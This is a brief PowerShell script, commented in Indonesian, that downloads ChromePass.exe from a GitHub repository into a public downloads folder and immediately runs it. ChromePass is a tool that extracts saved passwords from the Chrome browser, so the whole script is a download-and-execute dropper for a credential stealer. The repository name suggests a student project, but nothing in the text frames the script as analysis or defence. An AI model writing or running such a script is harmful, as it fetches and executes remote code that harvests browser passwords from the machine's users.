# URL repositori GitHub
$Url = "https://github.com/wisnusaputra56/tugasakhir/raw/main/ChromePass.exe"

# Direktori tempat mengunduh repositori
$downloadDir = "C:\Users\Public\Downloads"

# Nama file
$File = "ChromePass.exe"

# Unduh repositori dari GitHub
Invoke-WebRequest -Uri $Url -OutFile "$downloadDir\$File"

# Pindah direktori
cd $downloadDir

# Jalankan aplikasi 
.\ChromePass.exe
